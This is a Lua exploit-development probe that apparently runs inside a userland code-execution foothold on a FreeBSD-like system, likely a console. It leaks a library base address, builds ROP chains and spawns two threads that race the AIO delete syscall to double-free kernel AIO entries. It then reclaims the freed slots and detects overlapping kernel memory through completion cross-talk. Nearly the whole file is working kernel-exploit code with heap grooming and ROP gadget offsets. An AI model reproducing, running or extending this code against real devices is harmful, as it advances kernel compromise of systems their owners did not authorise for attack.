-- CRASH_CLASS: HIGH
-- PROBE 94b: AIO double-free → same-address overlap via completion cross-talk
--
-- After a double-free, two consecutive malloc(128) return the same address.
-- If both are AIO entries (from two separate submits), they share memory.
-- Test: complete one AIO, check if the other's poll status changes.
--
-- Strategy:
--   1. Submit 16 AIO requests on socketpairs (pending reads, no data)
--   2. Double-free all 16 via 662 race
--   3. Submit 32 new AIO requests (to reclaim the 16 doubled slots)
--   4. Complete some by writing to their socketpairs
--   5. Poll ALL 32 — if completion of request N also completes request M,
--      they share memory (N and M are at the same kernel address)

print("=== PROBE 94b: AIO OVERLAP DETECTION ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

-- AIO helpers
local reqs = memory.alloc(0x30)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function aio_submit(fd)
    local data_buf = memory.alloc(0x100)
    local result_buf = memory.alloc(0x10)
    wq(N(reqs), uint64(0))        -- offset
    wq(N(reqs) + 8, uint64(64))   -- nbytes = 64
    local bh, bl = (function()
        local v = uint64(N(data_buf))
        if type(v) == "table" and v.h then return v.h, v.l end
        return 0, N(v)
    end)()
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = (function()
        local v = uint64(N(result_buf))
        if type(v) == "table" and v.h then return v.h, v.l end
        return 0, N(v)
    end)()
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function aio_poll(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function aio_delete(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

-- ============================
-- Step 0: Init AIO subsystem
-- ============================
print("[0] Init")
pcall(function() mk(670)() end)

-- Pre-drain: submit and delete a few to prime the allocator
for i = 1, 32 do
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(2), uint64(0), sp))
    if sr == 0 then
        local rfd = rd(N(sp))
        local id = aio_submit(rfd)
        if id ~= 0 then aio_poll(id); aio_delete(id) end
        pcall(function() mk(6)(uint64(rd(N(sp)))) end)
        pcall(function() mk(6)(uint64(rd(N(sp)+4))) end)
    end
end
print("  pre-drain done")

-- ============================
-- Step 1: Create socketpairs + submit pending AIO reads
-- ============================
print("")
print("[1] Submit pending AIO reads on socketpairs")
local BATCH = 16
local victims = {} -- {id=, rfd=, wfd=}
local sp_buf = memory.alloc(8)

for i = 1, BATCH do
    wd(N(sp_buf), 0); wd(N(sp_buf)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(2), uint64(0), sp_buf))
    if sr ~= 0 then print("  sp fail at " .. i); break end
    local rfd = rd(N(sp_buf)) or -1
    local wfd = rd(N(sp_buf)+4) or -1
    local id = aio_submit(rfd)
    if id ~= 0 then
        victims[#victims + 1] = {id = id, rfd = rfd, wfd = wfd}
    else
        pcall(function() mk(6)(uint64(rfd)) end)
        pcall(function() mk(6)(uint64(wfd)) end)
    end
end
print(string.format("  submitted %d pending AIO reads", #victims))

-- Verify all pending
local pending_count = 0
for i = 1, #victims do
    local st = aio_poll(victims[i].id)
    if st == 3 then pending_count = pending_count + 1 end
end
print(string.format("  pending status: %d/%d have status=3", pending_count, #victims))

-- ============================
-- Step 2: Double-free via 662 race (two child threads)
-- ============================
print("")
print("[2] Double-free via 662 race")

-- Build ID array for batch delete
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
for i = 0, #victims - 1 do
    wd(N(del_ids) + i * 4, victims[i + 1].id)
    wd(N(states_A) + i * 4, 0xAAAAAAAA)
    wd(N(states_B) + i * 4, 0xBBBBBBBB)
end
local count = #victims

-- Child A: 662(ids, count, states_A)
local stk_A = memory.alloc(0x4000)
local sb_A = N(stk_A)
for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
local oA = 0
local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
-- sysarch first
emA(g_pop_rdi); emA(uint64(129))
emA(g_pop_rsi); emA(uint64(N(fsbase_ptr)))
emA(g_pop_rax); emA(uint64(165)); emA(stub)
-- 662 call
emA(g_pop_rdi); emA(uint64(N(del_ids)))
emA(g_pop_rsi); emA(uint64(count))
emA(g_pop_rdx); emA(uint64(N(states_A)))
emA(g_pop_rax); emA(uint64(662)); emA(stub)
-- exit
emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

-- Child B: same but states_B
local stk_B = memory.alloc(0x4000)
local sb_B = N(stk_B)
for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
local oB = 0
local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
emB(g_pop_rdi); emB(uint64(129))
emB(g_pop_rsi); emB(uint64(N(fsbase_ptr)))
emB(g_pop_rax); emB(uint64(165)); emB(stub)
emB(g_pop_rdi); emB(uint64(N(del_ids)))
emB(g_pop_rsi); emB(uint64(count))
emB(g_pop_rdx); emB(uint64(N(states_B)))
emB(g_pop_rax); emB(uint64(662)); emB(stub)
emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

-- Spawn both
local par_A = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
wq(N(par_A), g_bare_ret)
wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

local par_B = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
wq(N(par_B), g_bare_ret)
wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

pcall(function() mk(455)(par_A, uint64(0x38)) end)
pcall(function() mk(455)(par_B, uint64(0x38)) end)

-- Wait for children
for w = 1, 100000 do local _ = rd(sb_A) end

-- Count doubles
local doubles = 0
local double_indices = {}
for i = 0, count - 1 do
    local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
    local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
    if sA == 0 and sB == 0 then
        doubles = doubles + 1
        double_indices[#double_indices + 1] = i + 1
    end
end
print(string.format("  doubles: %d/%d", doubles, count))

if doubles == 0 then
    print("  NO DOUBLES — race lost, try again")
    -- Cleanup
    for i = 1, #victims do
        pcall(function() mk(6)(uint64(victims[i].rfd)) end)
        pcall(function() mk(6)(uint64(victims[i].wfd)) end)
    end
    print("alive=" .. (alive() and "Y" or "N"))
    print("=== 94b COMPLETE (no doubles) ===")
    return
end

-- ============================
-- Step 3: Reclaim with new AIO submissions
-- ============================
print("")
print("[3] Reclaim: submit new AIO reads")

-- Create fresh socketpairs for reclaim AIO
local reclaim = {} -- {id=, rfd=, wfd=}
local RECLAIM_N = doubles * 4 + 16  -- overshoot to increase reclaim probability

for i = 1, RECLAIM_N do
    wd(N(sp_buf), 0); wd(N(sp_buf)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(2), uint64(0), sp_buf))
    if sr ~= 0 then break end
    local rfd = rd(N(sp_buf)) or -1
    local wfd = rd(N(sp_buf)+4) or -1
    local id = aio_submit(rfd)
    if id ~= 0 then
        reclaim[#reclaim + 1] = {id = id, rfd = rfd, wfd = wfd}
    else
        pcall(function() mk(6)(uint64(rfd)) end)
        pcall(function() mk(6)(uint64(wfd)) end)
    end
end
print(string.format("  reclaim submitted: %d AIO requests", #reclaim))

-- ============================
-- Step 4: Complete HALF the reclaim AIO by writing to their socketpairs
-- ============================
print("")
print("[4] Complete first half of reclaim AIO")
local wbuf = memory.alloc(128)
for i = 0, 124, 4 do wd(N(wbuf) + i, 0x42424242) end

local half = math.floor(#reclaim / 2)
for i = 1, half do
    -- Write data to the socketpair → completes the pending AIO read
    pcall(function()
        mk(133)(uint64(reclaim[i].wfd), uint64(N(wbuf)), uint64(64), uint64(0x80))
    end)
end

-- Small delay for kernel to process completions
for w = 1, 10000 do local _ = rd(sb_A) end

-- ============================
-- Step 5: Poll ALL reclaim AIO — look for cross-talk
-- ============================
print("")
print("[5] Poll all reclaim AIO for cross-talk")
local completed = 0
local pending = 0
local anomalies = 0

for i = 1, #reclaim do
    local st = aio_poll(reclaim[i].id)
    local expected_complete = (i <= half)

    if st == 3 then -- 0x00000003 = completed
        completed = completed + 1
        if not expected_complete then
            -- This one SHOULD be pending but shows completed!
            -- Cross-talk: shares memory with a completed entry
            anomalies = anomalies + 1
            print(string.format("  *** ANOMALY: reclaim[%d] id=0x%X completed unexpectedly! ***",
                i, reclaim[i].id))
        end
    elseif st == 0x00010003 then
        completed = completed + 1
        if not expected_complete then
            anomalies = anomalies + 1
            print(string.format("  *** ANOMALY: reclaim[%d] id=0x%X polled-complete unexpectedly! ***",
                i, reclaim[i].id))
        end
    elseif st == 0xDEAD then
        pending = pending + 1
    else
        -- Unknown status
        if i <= 5 or i > #reclaim - 3 then
            print(string.format("  reclaim[%d] status=0x%08X", i, st))
        end
        if expected_complete and st ~= 3 and st ~= 0x00010003 then
            print(string.format("  NOTE: completed write but status=0x%08X at [%d]", st, i))
        end
    end
end

print(string.format("  completed=%d pending=%d anomalies=%d", completed, pending, anomalies))

if anomalies > 0 then
    print("")
    print("*** OVERLAP DETECTED: AIO entries share kernel memory ***")
    print("*** Double-free → same-address reclaim CONFIRMED ***")
end

-- ============================
-- Cleanup
-- ============================
print("")
print("[6] Cleanup")
for i = 1, #reclaim do
    -- Complete any remaining pending
    pcall(function()
        mk(133)(uint64(reclaim[i].wfd), uint64(N(wbuf)), uint64(64), uint64(0x80))
    end)
end
for w = 1, 10000 do local _ = rd(sb_A) end
for i = 1, #reclaim do
    aio_delete(reclaim[i].id)
    pcall(function() mk(6)(uint64(reclaim[i].rfd)) end)
    pcall(function() mk(6)(uint64(reclaim[i].wfd)) end)
end
-- Close victim socketpairs too
for i = 1, #victims do
    pcall(function() mk(6)(uint64(victims[i].rfd)) end)
    pcall(function() mk(6)(uint64(victims[i].wfd)) end)
end

print(string.format("alive=%s", alive() and "Y" or "N"))
print(string.format("RESULT: doubles=%d anomalies=%d", doubles, anomalies))
print("=== 94b COMPLETE ===")
